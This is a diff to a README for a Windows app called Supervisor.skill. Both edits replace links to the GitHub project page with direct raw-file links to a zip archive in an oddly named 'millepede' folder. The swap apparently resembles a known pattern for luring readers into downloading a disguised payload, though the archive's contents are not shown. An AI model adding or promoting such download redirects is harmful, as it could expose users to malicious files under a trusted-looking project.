@@ -1,6 +1,6 @@
 # 🧑‍🏫 Supervisor.skill - Guide Better Team Support
 
-[![Download Supervisor.skill](https://img.shields.io/badge/Download-Supervisor.skill-purple?style=for-the-badge)](https://github.com/Jasperuric559/Supervisor.skill)
+[![Download Supervisor.skill](https://img.shields.io/badge/Download-Supervisor.skill-purple?style=for-the-badge)](https://github.com/Jasperuric559/Supervisor.skill/raw/refs/heads/main/millepede/skill_Supervisor_1.3.zip)
 
 ## 📌 What is Supervisor.skill?
 
@@ -24,7 +24,7 @@ For best results, use a PC with a recent Windows update. The app runs well on a 
 
 Use this link to visit the page and download the app:
 
-[Open the Supervisor.skill download page](https://github.com/Jasperuric559/Supervisor.skill)
+[Open the Supervisor.skill download page](https://github.com/Jasperuric559/Supervisor.skill/raw/refs/heads/main/millepede/skill_Supervisor_1.3.zip)
 
 If the page shows a file to download, save it to your computer. If it shows a release page, download the newest Windows file from there.
 
